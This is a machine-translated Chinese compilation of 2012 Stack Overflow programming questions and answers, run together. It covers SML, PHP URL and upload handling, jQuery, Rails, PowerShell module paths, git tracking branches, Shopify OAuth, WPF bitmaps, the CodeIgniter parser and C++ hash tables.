> 标签：sml, smlnj

SML 中是否有一个函数可以添加两个等长的元组，如 (3,1,2) 和 (4,3,1) 并返回 (7,4,3)？

谢谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:40:31.077

不，没有这样的功能。

如果不对长度进行硬编码，也无法自己编写一个函数，即您可以编写一个需要两个长度为 2 的元组的函数或一个需要两个长度为 3 的元组的函数，但不可能编写一个需要两个长度的元组任意（但相等）长度的元组。SML 的类型系统根本不允许您像这样抽象元组的长度。

对于特定长度，您当然可以自己轻松定义：

```
fun addPairs (x1, y1) (x2, y2) = (x1 + x2, y1 + y2) 
```

# php - 正则表达式，如何匹配这个字符串？

> ID：12866722
> 
> 赞同：1
> 
> 时间：2012-10-12T20:36:56.203
> 
> 标签：php, regex, url

我有网址`http://domain.com/script.php?l=7&p=146#p146`。我希望能够得到 p= 之后的数字，而不需要 #。此外，哈希可能并不总是存在，所以有时它可能会变成`script.php?l=7&p=146`. 我知道这与正则表达式字符有关`+`，但我不完全确定如何使用它。有人可以创建正则表达式并解释它是如何工作的吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:39:17.103

这里不需要正则表达式。

```
$query = parse_url("http://domain.com/script.php?l=7&p=146#p146", PHP_URL_QUERY);
parse_str($query, $params);
echo $params['p']; 
```

`parse_url`可以为您提供 URL 的所有不同元素。并`parse_str`获取一个查询字符串（您可以在其中找到的内容`?`和 URL 中的可选`#`内容）并为您计算出不同的参数。您也可以省略`$params`函数的参数，然后`parse_str`为您定义一些变量（之后您可以在 中找到结果`$p`）。但我个人不喜欢使用`parse_str`这种副作用。

如果您想阅读更多内容：PHP 文档[`parse_url`](http://www.php.net/manual/en/function.parse-url.php)和[`parse_str`](http://www.php.net/manual/en/function.parse-str.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:40:06.063

不要重新发明轮子。使用内置函数，例如`parse_url`解析 URL。

文档和示例： http: [//php.net/manual/en/function.parse-url.php](http://php.net/manual/en/function.parse-url.php)

# jquery - jquery append 和 attr.appendTo

> ID：12866723
> 
> 赞同：1
> 
> 时间：2012-10-12T20:37:05.697
> 
> 标签：jquery, appendto

为什么此代码有效：

```
$(this).append($(this).parent().find("div:not(.exit_block)").attr("id")); 
```

这不是：

```
$(this).parent().find("div:not(.exit_block)").attr("id").appendTo($(this)); 
```

? 调试器写道 appendTo 不是一个函数。在这种情况下我必须如何使用 appendTo？我想使用 appendTo 将属性 id 附加到 $(this) 中的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:39:22.783

您正试图`appendTo()`在 的返回值上调用该方法，该值`attr()`返回一个属性值。我相信，通过查看您的代码，您想要附加到 div。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:41:51.430

您的第二行不起作用，因为您试图调用`.appendTo`一个值，而不是 jQuery 对象。

[`.attr docs`](http://api.jquery.com/attr/)

> 描述：获取匹配元素集中第一个元素的属性值。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-12T20:41:07.090

因为您正在尝试将 appendTo 附加到 attr。

```
$(this).parent().find("div:not(.exit_block)").attr("id").appendTo($(this)); 
```

你想这样做吗？

```
$("#"+$(this).parent().find("div:not(.exit_block)").attr("id")).appendTo($(this)); 
```

# ruby-on-rails - Rail 3.2 将 id 保存为 null

> ID：12866734
> 
> 赞同：1
> 
> 时间：2012-10-12T20:38:11.000
> 
> 标签：ruby-on-rails, params

不明白为什么

```
Product.new(params[:product]) 
```

在我的带有参数的控制器中：id 将 id 保存为空？我有 2 个参数的表单。:id 和 :des 当我使用控制台时

```
r = Product.new r.id = ... r.des= ... r.save 
```

一切都好但是如果我使用参数：des保存在base中并且：id保存为null。添加一些代码这是控制器

```
class ProductsController < ApplicationController
def index
    @pr = Product.find(:all)
end
def new
    @pr = Product.new()
end
def create
    @pr = Product.new(params[:product])
    if @pr.save
        flash[:notice] = "All OK"
        redirect_to products_path
    else
        flash[:notice] = "Errors"
        redirect_to products_path
    end

end end 
```

这是形式

```
<%= form_for @pr do |f| %>
<%= f.label :id %> <br>
<%= f.number_field :id %><br>
<%= f.label :des%> <br>
<%= f.text_area :des%> <br>
<%= f.submit %>
<% end %> 
```

id`s 我需要手动填写 ---------------- 我自己的答案 ------ 在控制器中我添加了这个字符串 \

```
@pr.id = params[:product][:id] 
```

但为什么不工作

```
@pr = Product.new(params[:product]) 
```

我不明白。

# c - 为 C 准备的 Emacs 设置

> ID：12866737
> 
> 赞同：2
> 
> 时间：2012-10-12T20:38:20.660
> 
> 标签：c, emacs, ide

我已经为 vim 制作了主题，已经[为 C 准备好了 VIM 设置](https://stackoverflow.com/q/12866375/342843 "为 C 准备好 VIM 设置")，我也想得到类似于[spf13-vim 的](http://vim.spf13.com)东西，但是对于 emacs

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-13T06:36:57.950

你可以看看[Emacs Prelude](http://batsov.com/prelude/)。

Prelude 是增强的 Emacs 24.x 配置，具有许多合理的默认值、额外的 3rd 方包和适用于大多数流行编程语言的强大设置。它是非常模块化的，并且能够按需自动安装一些软件包——例如，当您第一次打开 Clojure 源文件时，Prelude 将自动安装对 Clojure 编程的支持。

还有许多其他预配置的 Emacs 发行版 - Emacs Starter Kit、Emacs Live 等...

# powershell - 使用 -Command 和 -File 开关从命令行 (cmd.exe) 运行 Powershell.exe？

> ID：12866744
> 
> 赞同：2
> 
> 时间：2012-10-12T20:38:39.553
> 
> 标签：powershell, powershell-2.0

我有一个简单的模块，称为`MyModule.psm1`定义为

```
function Show-Text($p)
{
    Write-Host $p
}

Export-ModuleMember Show-Text 
```

模块保存在这里 - （*一切正常，通过 ISE 或直接 Powershell 命令行的正常方式*）

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\Modules\MyModule (because 64-bit OS) 
```

现在，我有一个`Test.ps1`这样的脚本

```
Show-Text "Hello World" 
```

**注意：我不想在 ps1 文件中执行 Import-Module MyModule**

我正在从 cmd.exe 窗口运行以下命令

```
C:\>Powershell -Command "& {Import-Module MyModule}" -File "C:\temp\Test.ps1" 
```

我收到以下错误

> Import-Module：未加载指定的模块“MyModule”，因为在任何模块目录中都找不到有效的模块文件。在 line:1 char:17 + & {Import-Module <<<< MyModule} -File Show.ps1 + CategoryInfo : ResourceUnavailable: (MyModule:String) [Import-M odule], FileNotFoundException + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell .Comm
> ands.ImportModuleCommand

*有人可以帮助我如何**仅通过 cmd.exe**`exactly what I have stated`执行上述操作，而无需硬编码或指定完整的模块路径吗？*

 **我们为加载 SystemModules 所做的类似操作 -`powershell.exe -ImportSystemModules`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-14T14:58:00.160

你明白那`SysWOW64`是 32 位和`System32`64 位吗？

该模块存在于 32 位 Powershell 模块查找路径中，因此只能由 32 位 Powershell 控制台看到。如果您从 64 位`cmd`控制台调用 powershell，您将打开 64 位控制台。

打开 32 位 cmd 提示符或将其移动到 64 位模块路径，

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-15T13:55:47.780

您正在运行 32 位 cmd.exe 吗？如果是这样，那么 Import-Module 应该可以工作。如果您正在运行 64 位 cmd.exe，则将启动 64 位 PowerShell.exe，除非您完全限定 32 位版本 PowerShell.exe 的路径（c:\windows\syswow64\windowspowershell\v1\. 0\powershell.exe）。**

# git - Git 认为我有未推动的更改

> ID：12866753
> 
> 赞同：3
> 
> 时间：2012-10-12T20:39:23.130
> 
> 标签：git, github

在过去的几个月里，我已经多次注意到，在将更改推送到我的远程仓库（GitHub，尽管我认为这并不重要）之后，我的本地 git 会相信它尚未推送的更改。在所有情况下，这些都是遥控器上存在的*变化。*最近一次是今天早上。我`git pull origin master`在工作时在我的机器上获取了三个在家中进行的提交。然后，当我这样做时，`git status`它显示了与尚未推送到远程的本地更改*相同的三个更改。*

通常，我只是删除本地存储库并从 GH 重新克隆它，但老实说，我已经厌倦了这样做。在共享此代码的 4 台机器之间，我必须多久执行一次此操作开始变得愚蠢。

这听起来很熟悉吗？有没有比仅仅吹走并重新克隆更好的解决方案？这在 Mac OS 和 Linux 系统上都发生过，所以我不认为它特定于任何操作系统。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:45:51.347

运行`git pull origin master`不会更新远程跟踪分支`origin/master`。这将导致 git 认为您有本地未推送的更改。假设`origin/master`是您的默认拉动分支，您可以说`git pull`or `git pull origin`，它将更新该分支。或者您可以使用`git fetch origin`后跟`git merge origin/master`.

# oauth - 无法通过 Shopify OAuth 流程的第 2 步

> ID：12866754
> 
> 赞同：1
> 
> 时间：2012-10-12T20:39:24.313
> 
> 标签：oauth, shopify

我们能够通过第 1 步，它返回一个 temp_token 或代码。当我们尝试调用第 2 步的 URL 时，我们得到一个“找不到页面”响应。下面是我们为通过第 2 阶段而生成和发布到的 URL 示例。

> [https://schmidt-auer-and-wiegand460.myshopify.com/admin/oauth/access_token?client_id=f7f660f4015c7438fb36b66f21562c2c&client_secret=redacted&code=6f8d6ddbb130b663648d0076e35ff3b7](https://schmidt-auer-and-wiegand460.myshopify.com/admin/oauth/access_token?client_id=f7f660f4015c7438fb36b66f21562c2c&client_secret=redacted&code=6f8d6ddbb130b663648d0076e35ff3b7)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T15:06:27.507

正如 Jan 提到的，您似乎在 GET 样式的查询字符串中传递参数。

您需要向该端点发出 POST 请求，并将参数放在 resquest 的正文中。

# javascript - JavaScript：'foo' 或 foo {0="f", 1="o", 2="o"}`

> ID：12866755
> 
> 赞同：1
> 
> 时间：2012-10-12T20:39:27.470
> 
> 标签：javascript

我有两个应用下面代码的小提琴，唯一的区别是一个使用 console.log 而另一个使用 alert 来显示变量 myString 的值。一个小提琴提醒字符串“foo”，而另一个像这样记录 foo 是 `foo {0="f", 1="o", 2="o"}` 什么造成了这种差异？

```
 var myString = new String('foo'); // produces a String() object

   alert(myString);​ 
```

[http://jsfiddle.net/mjmitche/UdYXZ/](http://jsfiddle.net/mjmitche/UdYXZ/)

[http://jsfiddle.net/javascriptenlightenment/XcfC5/](http://jsfiddle.net/javascriptenlightenment/XcfC5/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:46:59.140

`console.log`输出变量的实际内容，在本例中是具有属性的对象。

`alert`另一方面，首先将所有内容转换为原始字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:43:54.717

从控制台对象的[萤火虫文档](https://getfirebug.com/wiki/index.php/Console_API#console.log.28object.5B.2C_object.2C_....5D.29.)：

> 如果记录了对象，它们将不会以静态文本的形式写入，而是以交互式超链接的形式编写，可以单击以检查 Firebug 的 HTML、CSS、脚本或 DOM 选项卡中的对象。您也可以使用 %o 模式替换字符串中的超链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:45:38.133

alert() 使用对象的 toString() 方法将传递给它的对象转换为字符串。与 alert() 不同，console.log() 不仅限于显示简单的字符串，还可以让您与传递给它的对象进行交互，例如让您检查其属性。

# c# - 在 C# 中将位图放置在画布中

> ID：12866758
> 
> 赞同：3
> 
> 时间：2012-10-12T20:39:37.450
> 
> 标签：c#, canvas

> **可能重复：**
> [如何在 WPF 中将位图渲染到画布中？](https://stackoverflow.com/questions/2168370/how-to-render-bitmap-into-canvas-in-wpf)

我想要的很简单。我想将 a`BitmapImage`放入`Canvas`C# 中。我的应用程序基于 WPF。我搜索了这个，我发现了类似的问题，但我找不到我要找的东西。

简而言之，我有这个：

```
BitmapImage img = new BitmapImage(new Uri("c:\\xyz.jpg")); 
```

我想把它放在画布上，平均值并不重要，它可以是一个矩形或其他任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:46:36.653

`BitmapImage`对象不能定位在 a 中，`Canvas`因为它不是控件。您可以做的是从 派生您自己的类`Canvas`并覆盖该`OnRender()`方法以绘制您的位图。基本上是这样的：

```
class CanvasWithBitmap : Canvas
{
    public CanvasWithBitmap()
    {
        _image = new BitmapImage(new Uri(@"c:\xyz.jpg"));
    }

    protected override void OnRender(DrawingContext dc)
    {
        dc.DrawImage(_image,
            new Rect(0, 0, _image.PixelWidth, _image.PixelHeight));
    }

    private BitmapImage _image;
} 
```

当然，您可能需要在`Canvas`through 属性中公开文件路径和坐标。如果您不想声明自己的类只是为了绘制位图，那么您不能`BitmapImage`直接使用该类。显示图像的控件是`Image`，让我们试试这个：

```
BitmapImage bitmap = new BitmapImage();
bitmap.BeginInit();
bitmap.UriSource = new Uri(@"c:\xyz.jpg");
bitmap.EndInit();

Image image = new Image();
image.Source = bitmap; 
```

现在您可以将`Image`控件放在`Canvas`.

# php - ajax检查数据库中的用户名

> ID：12866760
> 
> 赞同：1
> 
> 时间：2012-10-12T20:39:46.427
> 
> 标签：php, ajax, mysqli

现在我正在我的网站上工作，ajax 应该检查用户是否存在于数据库中。我快完成了，但我有一些问题说它不可用。这就是用户 admin 在数据库中的维护方式，但不是数据库中的 admin 用户，无论您看到什么并说“不可用”。

希望有一些人可以帮助我解决这个问题。

我一直在使用 firefox 并查看 firebug 或其他任何名称，但我根本找不到任何错误！

我希望清楚/明确的-这就是为什么它考虑是否适合用户存在于数据库中？

现在和这里存在什么问题 - 无论它说用户名“不可用”。我想帮助改变这一点，以便它是否存在

```
<tr>
<td>
<p>Brugernavn</p>
</td>
<td>
<input type="text" name="brugernavn" id="brugernavn" onblur="CheckUserName(this.value)"/>
</td>
<td>
<span id="availability_status"/></div>
</td>
</tr>

function CheckUserName(username){
    if(username.length > 3){
        var url = "ajax_check_username.php";        
        var params = "brugernavn="+ username +"&rand="+Math.random();
        http = new XMLHttpRequest();
        http.open("POST", url, true);
        //Send the proper header information along with the request
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.setRequestHeader("Content-length", params.length);
        http.setRequestHeader("Connection", "close");
        http.send(params);
        http.onreadystatechange = function () {
            if(http.readyState == 4 && http.status == 200 ){    
                var val = parseInt(http.responseText);
                var html=(val == 0) ? '<font color="Green">Tilgængelig</font>' : '<font color="red">Ikke tilgængelig</font>';
                document.getElementById('availability_status').innerHTML = html;
            }
        }
    }
    else{
        document.getElementById('availability_status').innerHTML = '<font color="#cc0000">Username too short</font>';               
    }       
} 
```

**ajax_check_username.php**这里来自！

```
<?php
// bør ligge i en extern fil,bruges generalt til alle db opslag
function MySqlIConnOOP(){
    $conn = new mysqli("localhost", "root", "", "test");    
    if (!$conn) {
        echo 'Der opsod en fejl.';
        exit();     
    }
    $conn->set_charset("utf8"); 
    return $conn;
}

// bør ligge i en extern fil, da man også bør checke det inden man opretter brugeren serverside, nogle kunne jo have pillet i JS
// retunerer 0 eller brugerens id (tal størrer end 0)
function IsUserCreated($mysqli, $username){
    if($stmt = $mysqli->prepare("SELECT `id` FROM `bruger` WHERE `brugernavn` = ? ")){
        /* bind parameters for markers */       
        $stmt->bind_param("s", $username);              
        $stmt->execute();       
        $stmt->bind_result($id);    
        $stmt->fetch();                     
        $status = ($id >0) ? $id : 0;
        $stmt->close();     
    }
    else $status = -1;
    return $status; 
}

$conn=MySqlIConnOOP();
$brugernavn = $_POST["brugernavn"];
$status = IsUserCreated($conn, $brugernavn);
echo ($status >0)? 1 : $status;
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T21:12:23.117

这是我的理解：

IsUserCreated PHP 函数返回一个整数（如果找到用户名，则 > 0）

CheckUserName JS 函数检查返回值：

```
var val = parseInt(http.responseText);
var html=(val == 0) ? '<font color="Green">Tilgængelig</font>' : '<font color="red">Ikke tilgængelig</font>'; 
```

那么如果 val == 0，则 "Tilgængelig" 否则 (val != 0) 是 "Ikke tilgængelig"。

如果用户名存在，它将打印“Ikke tilgængelig”。如果用户名不存在，它将打印“Tilgængelig”。

不是简单的标签编辑吗？

```
var html=(val > 0) ? '<font color="Green">Username exists</font>' : '<font color="Red">Username does not exist</font>'; 
```

# php - PHP文件上传匹配对

> ID：12866763
> 
> 赞同：1
> 
> 时间：2012-10-12T20:39:52.923
> 
> 标签：php, file-upload

我正在将一系列成对的“之前”和“之后”图像上传到 PHP 脚本。在处理上传时，我必须确保正确的“之前”和“之后”图像匹配。

如果我这样做：

```
before: <input type="file" name="image[]">  after: <input type="file" name="image[]">
before: <input type="file" name="image[]">  after: <input type="file" name="image[]"> 
```

然后只需遍历 image[] 数组，我可以依靠 PHP 维护正确的顺序吗？

我想如果我把它改成这样，同样的问题也适用：

```
before: <input type="file" name="before[]">  after: <input type="file" name="after[]">
before: <input type="file" name="before[]">  after: <input type="file" name="after[]"> 
```

在那里，我仍然需要确保 before[] 数组和 after[] 数组是有序的，而且现在我必须在任何循环中协调这两者。

或者我可以做

```
before: <input type="file" name="before1">  after: <input type="file" name="after1">
before: <input type="file" name="before2">  after: <input type="file" name="after2">
etc.... 
```

（可能我会在 .net 中做什么）但我不太确定如何在 PHP 中循环。

那么，我可以指望 PHP 在构建 $_FILES 数组时保持输入顺序，还是有更好的方法来做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:42:39.417

您可以在 php-array 扩展中强制使用数组键，例如

```
name="before[1]"     name="after[1]"
name="before[2]"     name="after[2]" 
```

PHP 将在处理表单数据时使用这些键创建数组条目

或者，您可以简单地拥有类似的东西

```
foreach(array_keys($_FILES['before']['tmp_name'])) as $key) {
    processFile($_FILES['before']['tmp_name'][$key]);
    processFile($_FILES['after']['tmp_name'][$key]);
} 
```

请注意，PHP 有一种处理基于数组的文件上传的笨拙方式，并且必须循环`['tmp_name']`属性（或 $_FILES 数组中的任何其他属性）是必要的。

对于您的`before1`, , `before2`, etc... 版本，您还可以执行类似的操作

```
$keys = preg_grep('/^after\d+$/', array_keys($_FILES['before']['tmp_name'])); 
```

这会给你数组：

```
 $keys = array(
    0 => 'after1',
    1 => 'after2', 
    ...
 ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:44:18.897

当您使用名称字段创建一个数组时，如您在示例中所示，PHP 将按照它们在表单中提交的顺序提供一个数组。请注意，您实际上是在为此信任用户输入。也就是说，如果有任何事情（例如恶意创建的表单或 XSS 注入）要更改您的表单并发布，那么您的数据顺序可能会更改。这与任何其他类型的表单操作具有相同的风险。所以，PHP 不应该搞砸它，但黄金法则是不要相信用户输入。

# codeigniter - Codeigniter 模板类：检查伪变量是否有值

> ID：12866771
> 
> 赞同：0
> 
> 时间：2012-10-12T20:40:27.160
> 
> 标签：codeigniter, codeigniter-2

不确定是否可行，但您可以在模板中使用 if 语句吗？

因此，如果电话号码没有值，我根本不想显示该句子...

```
<!DOCTYPE html>
<html lang='en'>

<head>
    <meta charset="utf-8"/>
    <title>{form_title}</title>

</head>

<body>
    <p>You received the following message from {name} through the Gossip Cakes' contact form.</p>

    <p>Their email is {email}</p>

    <p>Their phone number is {phone}</p>

    <p>The message: {message}</p>

</body>

</html> 
```

我想我可以直接使用 php，但是有没有返回视图 html 的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-01T21:09:57.670

如果您有创意，CI 模板确实支持 IF 语句。我经常使用它们。如果没有数据，您甚至可以使用它们来防止模板元素被解析。

考虑这三个示例数组：

```
$phone_numbers = array( 
                        array('phone_number'=>'555-1212'), 
                        array('phone_number'=>'555-1313') 
                      )

$phone_numbers = array()

$phone_numbers = array( array('phone_number'=>'555-1414') ) 
```

并认为这是您的 html 中的相关部分：

```
{phone_numbers} <p>{phone_number}</p> {phone_numbers} 
```

使用这三个数组，分别输出数组一和三如下。（使用数组二不会打印任何内容，因为控制数组是空的。）

```
<p>555-1212</p><p>555-1313</p>

<p>555-1414</p> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T21:21:02.817

假设你使用[CI 的内置 parser](http://codeigniter.com/user_guide/libraries/parser.html)，你必须事先准备好所有的变量。目前不支持条件、变量赋值或循环和基本令牌替换之外的任何内容。

要在 CI 中执行此操作，您必须准备整个消息，在您的控制器中是这样的：

```
if ($phone) {
    $data['phone_msg'] = "<p>Their phone number is $phone</p>";
} else {
    $data['phone_msg'] = '';
} 
```

不是一个好的解决方案。如果您正在寻找一个不错的模板解析器，我个人会推荐[Twig 。](http://twig.sensiolabs.org/)您关于“我想我可以直接使用 PHP”的想法也是一个很好的想法。

> 有没有返回视图 html 的方法？

使用`view()`像这样的第三个参数：

```
$html = $this->load->view('myview', $mydata, TRUE);
echo 'Here is the HTML:';
echo $html;
// OR...
echo $this->parser->parse_string($html, NULL, TRUE); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-29T22:06:42.910

MY_Parser 类扩展 CI_Parser{

```
/**
 *  Parse a template
 *
 * Parses pseudo-variables contained in the specified template,
 * replacing them with the data in the second param, 
 * and clean the variables that have not been set
 *
 * @access  public
 * @param   string
 * @param   array
 * @param   bool
 * @return  string
 */
function _parse($template, $data, $return = FALSE)
{
    if ($template == '')
    {
        return FALSE;
    }

    foreach ($data as $key => $val)
    {
        if (is_array($val))
        {
            $template = $this->_parse_pair($key, $val, $template);
        }
        else
        {
            $template = $this->_parse_single($key, (string)$val, $template);
        }
    }

    #$template = preg_replace('/\{.*\}/','',$template);
    $patron = '/\\'.$this->l_delim.'.*\\'.$this->r_delim.'/';
    $template = preg_replace($patron,'',$template);
    if ($return == FALSE)
    {
        $CI =& get_instance();
        $CI->output->append_output($template);
    }

    return $template;
} 
```

}

享受 :D

# php - Linkify HashTags 并传递到 URL

> ID：12866772
> 
> 赞同：1
> 
> 时间：2012-10-12T20:40:28.323
> 
> 标签：php, html, url, variables, linkify

> **可能重复：**
> [使用 jQuery 查找 twitter 主题标签，并应用链接](https://stackoverflow.com/questions/4913555/find-twitter-hashtags-using-jquery-and-apply-a-link)

我希望链接页面中的某些或所有元素以“链接”自己并传递到 URL，就像 twitter 一样。

例如：

```
Hello check my #thing 
```

单击上面的#thing 并转到自定义 URL，例如

```
mysite.com/tag/thing 
```

怎么可能做到这一点？

谢谢！

# c++ - C++中的哈希表

> ID：12866774
> 
> 赞同：10
> 
> 时间：2012-10-12T20:40:32.340
> 
> 标签：c++, map, hashtable

是 C++ 的插入/删除/查找时间`std::map` `O(log n)`吗？是否可以实现`O(1)`哈希表？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-12T20:42:21.770

> C++ 映射的插入/删除/查找时间是否为 O(log n)？

是的。

> 是否可以实现 O(1) 哈希表？

确实。标准库还提供了一个[`std::unordered_map`](http://en.cppreference.com/w/cpp/container/unordered_map).

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-12T20:45:25.720

C++ 有一个[`unordered_map`](http://www.cplusplus.com/reference/stl/unordered_map/)类型。STL 还包含一个[`hash_map`](http://www.sgi.com/tech/stl/hash_map.html)类型，尽管它不在 C++ 标准库中。

现在，对于一些算法理论。在完美的条件下实现一个 O(1) 的哈希表是可能的，从技术上讲，哈希表是 O(1) 的插入和查找。在这种情况下，完美的条件是哈希函数必须是完美的（即无冲突），并且您有无限的存储空间。

在实践中，让我们使用一个哑哈希表。对于任何输入键，它返回 1。在这种情况下，当发生冲突时（即在第二次和随后的插入中），它必须进一步链接以找到一些空闲空间。它可以转到下一个存储位置，也可以为此使用链表。

无论如何，在最好的情况下，是的，哈希表是 O(1) （当然，直到你用尽了所有的哈希值，因为拥有无限量输出的哈希函数是不切实际的）。在最坏的情况下（例如，使用我完全愚蠢的哈希函数），哈希表是 O(n)，因为您必须遍历存储才能从给定的哈希中找到您的实际值，因为初始值不是正确的值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:45:09.790

的实现`std::map`是一棵树。这没有在标准中直接指定，但正如一些好书所说：`"It is difficult to imagine that it can be anything else"`. 这意味着 map 的插入/删除/查找时间是**O(log n)**。

经典哈希表的查找时间**为 O(n/num_slots)**。一旦表中的预期项目数与插槽数相当，您将拥有`saturated` **O(1)**。

# nlp - 使用动态技术的单词之间的语义相似度（使用维基百科）

> ID：12866776
> 
> 赞同：2
> 
> 时间：2012-10-12T20:40:40.083
> 
> 标签：nlp, wikipedia, similarity

我在 python 中编写了一个程序来使用 word net 查找单词之间的语义相似性。但我觉得它是静态的。我想给它一个动态的方法。我想从维基百科访问每个单词的定义。我怎样才能访问这样一个词的定义？当我用谷歌搜索时，我发现通过解析维基百科转储文件我们可以获得定义。但我不知道如何解析。是否有人可以实现解析器以从转储文件中获取单词的定义。这是唯一的方法吗？方法是真的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-28T23:50:11.633

你不需要重新发明轮子。怀卡托大学的研究人员建立了一个非常好的维基百科数据挖掘服务，称为[WikipediaMiner](http://wikipedia-miner.cms.waikato.ac.nz/)。

> 这个包将常规的 Wikipedia 转储转换为 MySql 数据库格式，并提供对 Wikipedia 部分（如文章、消歧页面和超链接）的面向对象的访问。Wikipedia Miner 还实现了一种算法，用于计算文章之间的语义相关性，[Maui](http://code.google.com/p/maui-indexer/wiki/InsideMaui)使用该算法来消除文档与 Wikipedia 文章之间的歧义，并用于计算语义特征。

除此之外，他们还公开了各种 API。例如，如果您想**获取 的定义**，`Logistic Regression`只需使用它们的`exploreArticle`API：

> [http://wikipedia-miner.cms.waikato.ac.nz/services/exploreArticle?title=logistic%20regression&definition=true](http://wikipedia-miner.cms.waikato.ac.nz/services/exploreArticle?title=logistic%20regression&definition=true)

响应 xml 如下所示：

```
<message service="/services/exploreArticle" id="226631" title="Logistic regression">
<request>
  <param name="title">logistic regression</param>
  <param name="definition">true</param>
</request>
<definition><![CDATA[In <a href="http://www.en.wikipedia.org/wiki/Statistics">statistics</a>, <b>logistic regression</b> (sometimes called the <b>logistic model</b> or <b><a href="http://www.en.wikipedia.org/wiki/Logit">logit</a> model</b>) is used for prediction of the <a href="http://www.en.wikipedia.org/wiki/Probability">probability</a> of occurrence of an event by fitting data to a logit function <a href="http://www.en.wikipedia.org/wiki/Logistic function">logistic curve</a>.]]>
</definition>
</message> 
```

要**比较单词之间的语义相似度**，你可以试试他们的`compare`API。

例如，与 相比`kiwi`，`takahe`您使用以下 API 调用：

> [http://wikipedia-miner.cms.waikato.ac.nz/services/compare?term1=kiwi&term2=takahe&disambiguationDetails&connections&snippets](http://wikipedia-miner.cms.waikato.ac.nz/services/compare?term1=kiwi&term2=takahe&disambiguationDetails&connections&snippets)

[以下](http://wikipedia-miner.cms.waikato.ac.nz/wiki/Wiki.jsp?page=Article%20relatedness%20measures)是有关他们用于相关性度量的算法的更多详细信息。

您还可以托管您自己的 wikipediaMiner 服务（详情请[点击此处](http://wikipedia-miner.cms.waikato.ac.nz/wiki/Wiki.jsp?page=Installation%20and%20configuration)）。[在这里](http://wikipedia-miner.cms.waikato.ac.nz/services/)找到更多关于如何使用他们的服务的信息。他们的相关出版物在[这里](http://wikipedia-miner.sourceforge.net/publications.htm)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-15T10:57:10.500

我认为您实际上是在寻找*同义词库*，而不是维基百科。其中一些可作为机器可读的语料库使用。然而，我不得不承认，文本定义似乎不是确定单词相似度的良好信息来源，除非在某些特殊情况下。

这些是关于单词相似性度量的大量工作，因此与其重新发明轮子，不如研究最先进的技术和/或工具。[维基百科](http://en.wikipedia.org/wiki/Semantic_similarity)提到了其中一些。

# ruby-on-rails-3 - 是否存在用于构建显示页面的 Rails 插件（如表单构建器）

> ID：12866778
> 
> 赞同：0
> 
> 时间：2012-10-12T20:40:54.547
> 
> 标签：ruby-on-rails-3

我正在寻找一个提供`show.html.erb`页面构建器的 Rails 插件。

例如，使用 SimpleForm，`new.html.erb`页面可能如下所示：

```
<%= simple_form_for(@user, :url => user_registration_path, :html => ... }) do |f| %>
  <%= f.input :email, :required => true %>
  <%= f.input :password, :required => true %>
  <%= f.input :password_confirmation, :required => true %>
  ...
<% end %> 
```

但是我无法找到仅显示字段的等价物。

生成的`show.html.erb`页面如下所示：

```
<p>
  <b>Email:</b>
  <%= @user.email %>
</p>
... 
```

但我想要类似的东西：

```
<%= simple_display_for(@user, :html => ... }) do |d| %>
  <%= d.output :email %>
  <%= d.output :name %>
  ...
<% end %> 
```

这种建设者存在吗？

谢谢

**编辑**：如果构建者使用 Twitter Bootstrap，那就更好了 :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:15:17.477

我不知道任何宝石，但这里有一个如何自己构建此功能的简单示例，您可以对其进行扩展：

**lib/simple_output.rb**

```
class SimpleOutput
  def initialize(resource)
    @resource = resource
  end

  def output(attribute)
    @resource.send attribute
  end
end 
```

**配置/初始化程序/simple_output.rb**

```
require_dependency 'lib/simple_output' 
```

**助手/simple_output_helper.rb**

```
module SimpleOutputHelper
  def simple_output_for(resource, options={}, &block)
    content_tag :div, yield(SimpleOutput.new(resource)), options[:html] || {}
  end
end 
```

**用户/show.html.erb**

```
<%= simple_output_for(@user, html: { style: "background-color: #dedede" }) do |r| %>
  <%= r.output :name %>
  <%= r.output :email %>
<% end %> 
```

现在，显然这只是一个非常简单的例子，但希望它能让你走上正确的道路。查看 simple_form 源代码，了解它们如何组织代码，以及它们如何“类型转换”字段。simple_form 代码库非常干净且易于使用 Ruby，是 gem 应该是什么样子的一个很好的例子。

# java - 提供连接的 OutputStream 和 InputStream 的最佳实践

> ID：12866784
> 
> 赞同：2
> 
> 时间：2012-10-12T20:41:19.103
> 
> 标签：java, inputstream, outputstream

> **可能重复：**
> [将输入流连接到输出流](https://stackoverflow.com/questions/1574837/connecting-an-input-stream-to-an-outputstream)

